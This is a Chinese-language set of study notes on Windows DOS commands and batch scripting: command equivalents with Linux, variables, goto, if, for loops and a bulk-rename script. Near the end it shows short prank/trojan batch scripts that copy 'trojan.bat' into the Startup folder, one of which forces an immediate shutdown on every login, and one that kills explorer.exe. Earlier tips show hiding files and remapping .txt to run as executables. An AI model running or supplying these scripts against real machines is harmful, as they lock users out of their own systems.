# DOS命令和bat脚本

参考：

http://docs.30c.org/dosbat/chapter05/index.html

[TOC]

## Linux命令对比

| Windows                  | Linux    |
| ------------------------ | -------- |
| cls                      | clear    |
| md                       | mkdir    |
| rd                       | rm       |
| echo                     | echo     |
| dir                      | pwd      |
| type                     | cat      |
| del                      | rm       |
| attrib修改文件属性       |          |
| copy                     | cp       |
| move同样也可以重命名文件 | mv       |
| shutdown                 | shutdonw |
| tasklist                 | ps       |
| taskkill                 | kill     |
| ren重命名                | mv       |

- `runas /noprofile /user:administrator cmd` 以管理员身份运行Dos窗口，需要设置密码

- ==start如果后面不加参数打开dos窗口==， 配合标签无限打开dos窗口

- call 调用批处理脚本或标签块

- help列出所有Dos命令

- 命令后面使用斜杠加问好查看dos命令`copy /?`

- `dir /a`等价于`ls /a`

- `copy con test.txt`多行输入, con（console）代表控制台，CTRL + z退出

- type 可以使用管道符

  `type test.txt | grep more`等价于 `cat test.txt | grep more`

- del 可以删除文件和目录, 后面跟目录表示删除==当前目录下==所有的文件, 也可以使用通配符

  `del *.txt`删除当前根目录下所有的txt文件

- `attrib +H ./* `隐藏当前文件夹下的所有文件，不需要管理员权限

- fsutil 

  `fsutil file createnew test.txt 102400`创建一个100KB的文件但是内容为空，可以将文件隐藏

- assoc

  `assoc .txt=exefile`将后缀为txt文件变成可执行文件

  `assoc .txt=txtfile`将后缀txt文件还原会txt文件

- ==shutdown==

  /a 终止系统关闭

  /t 指定在多长时间后执行 `shutdown -s -t 0`立即关机, 已秒为单位

  /f 强制

  /r 重启

  /s 关机

  /l 注销 == logoff

  /c 加入comment

- net share

  查看共享文件

- net user

  查看用户

## Dos系统变量

参考：

https://www.cnblogs.com/lbnnbs/p/4781448.html

## bat批处理

执行bat脚本会在一个Dos窗口中顺序执行脚本中的所有命令，回显执行的命令

- 在dos中同样存在逻辑短路

  ```shell
  netstat /a /n | find "7626" && echo 已被冰河感染 || echo 未被冰河感染 。
  ```

- pause

  默认不会挂起，将执行脚本的当前窗口挂起

- @ 

  不回显输入的命令

  ```shell
  echo hello world
  @echo 你好
  pause
  ```

<img src="..\..\imgs\_Dos\Snipaste_2020-08-26_19-29-12.png"/>

- echo

  echo 在Dos窗口中输出内容

   echo off， 在该命令之后的所有命令都不会回显，但是当前的echo off 会回显

  echo on，重新回显命令，缺省值

  ==@echo off==，echo off命令也不会回显

  `>`, `>>`同linux中命令相同

- title

  更改bat调用Dos窗口的标题

- set

  ==注意赋值符左右不能有空格==

  set /a 赋一个数值变量, 默认以字符串处理

  set /p 用户输入一个值

  ==通过%%访问变量的值==

  ```shell
  set /p   a=hello world
  这里的a并不等于hello world 而等于用户给定的值
  ```

  将a的值赋给b

  ```shell
  echo hello world
  set /a var =100
  set /a b =%var%
  echo %b%
  pause
  ```

  子串,index 从0开始

  ```shell
  set var=12345
  echo %var:~1% # 2345 [1：]
  echo %var:~1,2% #23  [1：3]
  echo %var:~-1%  #5 [len(var)-1:]
  echo %var:~0,3% #123 [:4]
  pause
  ```

  替换

  ```shell
  set var=hello world
  echo %var:o=a% #hella warld
  pause
  ```

- goto

  配合标签使用（==标签同样会顺序执行==），类似于golang中的goto，但是冒号方向不同， 不需要提前定义

  ```shell
  echo hello world
  goto 2
  :1
  echo hello
  :2
  echo world
  pause
  ```

<img src="..\..\imgs\_Dos\Snipaste_2020-08-26_20-37-45.png"/>

> ==一般定义一个标签作为bat结束处理==
>
> 这里ERRORLEVEL是系统变量，如果出错为1，否则为0

```shell
@echo off
if %ERRORLEVEL% == 0 goto 0
else %ERRORLEVEL% == 0 goto 1
goto 2
:0
echo 0
goto 2
:1
echo 1
goto 2
:2
echo 2
pause
```

- call

  与goto相似但是需要带上冒号，==不是调用==，同时也可以加上路径调用bat文件

  ```shell
  #这里是一个循环
  echo hello world
  :1
  echo nihao
  call :1
  pause
  ```

- start

  ==后面不更参数表示，开启一个dos窗口==

  ```
  start notepad
  start mspaint
  start www.baidu.com
  ```

- if

  具体参照`if /?`, 括号可以省略

  ```shell
  @echo off
  set var=tom
  if %var%==tom echo tom
  if %var%==jerry (
  echo jerry
  )
  if not %var% == henry echo fake
  echo hello world
  pause
  ```

  if exist

  ==判断文件是否存在==

  ```shell
  if exist "D:\test my folder\a.txt" (
  del "D:\test my folder\a.txt"
  ) else (
  echo 您所要删除的文件不存在
  )
  ```

  if defined

  ==判断变量是否存在==，注意这里不加%%

  ```shell
  @echo off
  set var=tom
  if defined var echo %var%		
  goto ans%ERRORLEVEL%
  pause
  ```

- if-else

  这里的%Time%是环境变量, lss 是if的扩展表示小于

  ```shell
  @echo off
  if %TIME:~0,2% lss "12" (
  echo 现在是上午
  ) else (
  echo 现在是下午
  )
  pause
  ```

- for

  参考：

  https://www.cnblogs.com/DswCnblog/p/5435300.html

  http://docs.30c.org/dosbat/chapter04/index.html

  类似forrange，foreach

  1. for, in ,do是循环语句的关键字
  2. ==%%i 是对形式变量的应用(这里的%相当于转译符)==，就算do语句中没有使用，也一定要出现
  3. ==必须将指令写在一行==
4. in表示范围
  
  ```shell
  echo hello world
  for %%i in (1 2 3 4) do echo %%i
  pause
  ```

<img src="..\..\imgs\_Dos\Snipaste_2020-08-26_20-27-44.png"/>

### 在脚本中调用脚本

```shell
@echo off
hello
--------
@echo off
echo hello world
pause
```

两个脚本, test.bat 和 hello.bat, 调用test.bat会调用hello.bat

### 处理文件

遍历字符串或是文件

```shell
@echo off
for /f %%i in ("hello") do echo %%i
for /f %%i in (hello.txt) do echo %%i 
pause
```

遍历当前目录下的所有文件

```shell
@echo off
for %%i in (*.txt) do echo "%%i"
pause
```

批量修改文件

```shell
@echo off
title 批量修改文件名
setlocal EnableDelayedExpansion


:GetPath
set zpath=%CD%
set /p zpath=请输入目标文件所在的路径：
if %zpath:~0,1%%zpath:~-1%=="" set zpath=%zpath:~1,-1%
if not exist "%zpath%" goto :GetPath


:GetPrefix
set prefix=未命名
set /p prefix=请输入文件名前缀(不能包含以下字符\/:*?"<>|)：
for /f "delims=\/:*?<>| tokens=2" %%i in ("z%prefix%z") do goto :GetPrefix


:GetExt
set ext=.*
set /p ext=请输入文件的扩展名(不输入则表示所有类型)：
if not "%ext:~0,1%"=="." set ext=.%ext%


set answer=N
echo.
echo 您试图将 %zpath%\ 里的所有 %ext% 类型的文件以 %prefix% 为前缀名进行批量改名，是否继续？
set /p answer=继续请输入 Y ，输入其它键放弃...
if "%answer%"=="Y" goto :ReadyToRename
if "%answer%"=="y" goto :ReadyToRename

echo 放弃文件改名，按任意键退出... & goto :PauseThenQuit

:ReadyToRename

set /a num=0
echo.

if "%ext%"==".*" (
for %%i in ("%zpath%\*%ext%") do (
set /a num+=1
ren "%%i" "%prefix%!num!%%~xi" || echo 文件 %%i 改名失败 && set /a num-=1
)
) else (
for %%i in ("%zpath%\*%ext%") do (
set /a num+=1
ren "%%i" "%prefix%!num!%ext%" || echo 文件 %%i 改名失败 && set /a num-=1
)
)

if %num%==0 echo %zpath%\ 里未发现任何文件。按任意键退出... & goto :PauseThenQuit

echo 文件改名完成，按任意键退出...

:PauseThenQuit
pause>nul
```

## 添加文件到自动启动栏

如果路径中存在特殊字符需要使用引号标识,` >nul 结果不往命令行输出`, dos默认 >con输出到控制台

```shell
@echo off
echo you have been hacked.
copy trojan.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup">nul
echo bingo!!!
```

### 循环关机

```shell
@echo off
echo you have been hacked.
copy trojan.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup">nul
shutdown -s -t 0
```

### 删除桌面进程

```shell
@echo off
color 0a
taskkill /im  explorer.exe /f
for %%i in(1 2 3 4 5)do ping /n 1 localhost>nul&&echo %%i
pause
start c:/windows/expolrer.exe
pause
```

## 案例

```shell
@echo off
title 小程序 v 1.0
color 0a
:menu
echo ===========
echo 菜单
echo 1.定时关机
echo 2.取消定时
echo 3.退出
echo ===========
set /p num=您的选择：
if "%num%" == "1" goto 1
if "%num%" == "2" goto 2
if "%num%" == "3" goto 3
:1
set /p a=请输入时间（单位/秒）：
shutdown -s -f -t %a%
goto menu
:2
shutdown -a
goto menu
:3
exit
```

## 遍历文件

```
@echo off
set Dir="F:\test"
for /r  %%d in (*) do echo %%d
pause
```

